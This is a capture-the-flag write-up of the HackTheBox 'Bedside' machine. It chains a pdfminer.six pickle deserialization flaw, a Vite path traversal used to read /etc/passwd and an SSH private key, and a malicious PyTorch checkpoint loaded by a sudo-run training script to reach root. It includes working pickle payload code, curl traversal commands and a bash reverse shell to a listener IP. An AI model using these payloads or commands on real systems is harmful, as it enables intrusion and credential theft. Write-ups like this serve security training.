# HackTheBox Bedside Full Chain Penetration Testing

## Initial Enumeration

- Target IP: `10.129.132.14`
- TCP Port Scan:
  - `22/tcp` - OpenSSH `10.0p2 Debian 7+deb13u4`
  - `80/tcp` - Apache HTTP Server `2.4.68`
- Hostname Discovery:
  - `bedside.htb`
  - `research.bedside.htb`
- HTTP Enumeration:
  - `bedside.htb` -> `/javascript`
  - `research.bedside.htb` → `/uploads`
  - `research.bedside.htb` → `/javascript`
- HTTP Behavior: Requests to port `80` redirect to `http://bedside.htb/`.
- Vhost Enumeration: Identification of `research.bedside.htb` as an additional virtual host.

## External Reconnaissance and Web Entry

- Research Portal: `research.bedside.htb` exposes a web application allowing users to upload PDF files.
- Application Analysis: The backend processes uploaded documents using `pdfminer.six`.
- Vulnerable Component: Identified a vulnerable version of `pdfminer.six`.

## Exploitation and Initial Access

- `CVE-2025-64512`: Exploitation of unsafe pickle deserialization in `pdfminer.six`.
- Exploit Automation: A custom Python script was used to generate the malicious pickle payload and the corresponding PDF trigger.
- Pickle Payload: The payload uses a custom `RCE` class with `__reduce__()` returning `os.system`, allowing arbitrary command execution during deserialization.

```python
class RCE:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))
```

- PDF Trigger: The generated PDF embeds the target payload path in the `/Encoding` field. `/` characters are encoded as `#2F` before being inserted into the PDF.
- Payload Delivery: The malicious PDF was uploaded through the Research Portal.
- Trigger: Processing the PDF caused the vulnerable `pdfminer.six` code path to load and deserialize the attacker-controlled `.pickle.gz` payload.
- Initial Shell: RCE was used to obtain a reverse shell as `datawrangler` inside the Docker container.


## Initial Container Enumeration

- User Context:
  - `uid=988(datawrangler)`
  - `gid=1001(dataops)`
- Important Files and Directories:
  - `/datastore`
- Application Behavior: `pdf_watcher.py` monitors the upload directory and processes uploaded PDFs

- Datastore Structure:
  - `/datastore/checkpoints`
  - `/datastore/logs`
  - `/datastore/models`
  - `/datastore/processed`
  - `/datastore/raw`
  - `/datastore/staging`

## Internal Service Enumeration

- Local Service Discovery: An HTTP server was identified on `127.0.0.1:3000`.
- Application Identification: `Bedside Clinic - Image Viewer`
- Technology Identification:
  - `React`
  - `Vite` development server
  - `/@hmr` endpoint indicating Vite development tooling

## Vite Path Traversal / Arbitrary File Read

- Vulnerability Identification: The internal Vite development server was vulnerable to path traversal.
- Proof of Concept: A URL-encoded traversal sequence was used to escape the intended web root.
- Initial Verification: `/etc/passwd` was successfully read through the Vite service.
- Impact: Arbitrary file read, allowing access to files outside the intended application directory.
- Insight: The traversal sequence had to be URL-encoded (`%2e%2e%2f`) while the remaining path was left unencoded. A raw `/../../../../etc/passwd` request was not processed successfully.
- Working
``` bash
curl "http://127.0.0.1:3000/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd"
```
- Not working
``` bash
curl "http://127.0.0.1:3000/../../../../etc/passwd"
```
## Credential Extraction

- Target File:
  `/home/developer/.ssh/id_rsa`
- Exploitation: The Vite path traversal was used to retrieve the private SSH key belonging to `developer`.
``` bash
curl "http://127.0.0.1:3000/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/home/developer/.ssh/id_rsa"
```
- Result: Private RSA key successfully recovered from the container-accessible internal service.

## SSH — developer

- Authentication: The extracted private SSH key was used to authenticate as `developer`.
- Host Pivot: SSH access provided a stable shell on the underlying Bedside host outside the Docker container.
- Result: Initial host-level access as `developer`.

## Privilege Enumeration

- Sudo Enumeration:
  `sudo -l`
- Privileged Command:

  `(ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py`

- Impact: `developer` can execute `/opt/trainer/bedside_trainer.py` as `root` without authentication.

## PyTorch / MONAI Application Analysis

- Target Script:
  `/opt/trainer/bedside_trainer.py`
- Frameworks:
  - PyTorch `2.5.0+cpu`
  - MONAI `1.5.0`
- Checkpoint Directory:
  `/datastore/checkpoints`
- Checkpoint Selection: The script searches for `.pt` files and selects the newest file based on modification time.

  `checkpoint_dir.glob("*.pt")`

- Vulnerable Sink: MONAI `CheckpointLoader` invokes:

  `torch.load(self.load_path, map_location=self.map_location, weights_only=False)`

## Unsafe Checkpoint Deserialization

- Security Issue: `weights_only=False` enables full pickle deserialization.
- Attack Primitive: Python objects contained in the checkpoint can define a custom `__reduce__()` method.
- During deserialization, the callable returned by `__reduce__()` is invoked.
- Security Impact: Attacker-controlled checkpoint data can result in arbitrary code execution in the context of the process loading the checkpoint.

## Checkpoint Write Access

- Previously compromised `datawrangler` account has write access to:
  `/datastore/checkpoints`
- Attack Chain:
  - `datawrangler` creates or replaces a `.pt` checkpoint.
  - `developer` executes the training script through `sudo`.
  - The script selects the malicious checkpoint.
  - `torch.load(..., weights_only=False)` deserializes the attacker-controlled object.

## Payload Construction

- A custom Python object was created with `__reduce__()` returning `os.system`.
- Initial PoC used:

  `return (os.system, ("id",))`

- Successful test execution produced:

  `uid=0(root) gid=0(root) groups=0(root)`

- This confirmed that arbitrary commands were being executed in the context of the privileged process.
- Payload generator
``` python
import os
import torch

class PoC:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/10.10.15.12/7777 0>&1'",))

torch.save(PoC(), "deadman.pt")
```
## Payload Compatibility

- Initial payload generated using a newer PyTorch version failed on the target with:
  `EOFError: Ran out of input`
- A Docker container was used locally to obtain the required PyTorch version without changing the system Python installation on Kali.

## Payload Transfer

- The generated binary `deadman.pt` was transferred to the target through base64 encoding.
- Integrity Verification: SHA-256 hashes were calculated on both the attacker and target systems.
- Matching hashes confirmed byte-for-byte integrity of the transferred checkpoint.
- The payload modification time was updated so that `find_latest_checkpoint()` selected `deadman.pt` over legitimate checkpoints.

## Root Code Execution

- Training workflow was triggered using:

  `sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py`

- The script selected:

  `/datastore/checkpoints/deadman.pt`

- MONAI invoked:

  `torch.load(..., weights_only=False)`

- The malicious checkpoint triggered the `__reduce__()` method.
- `os.system()` executed the supplied command in the root process context.
- Final result: RCE as `root`.

## Reverse Shell

- Final payload used a Bash reverse shell to the attacker-controlled listener.
- Callback:
  `10.10.15.12:7777`

## Key Vulnerabilities

- CVE-2025-64512 — `pdfminer.six` unsafe deserialization leading to code execution.
- Vite path traversal — arbitrary file read from the internal development server.
- CWE-502 — Deserialization of Untrusted Data in the PyTorch checkpoint loading workflow.
- Insecure `sudo` configuration — unrestricted root execution of a Python training script whose input files are user-controlled.
- Unsafe use of `torch.load(..., weights_only=False)` on attacker-controlled checkpoint data.
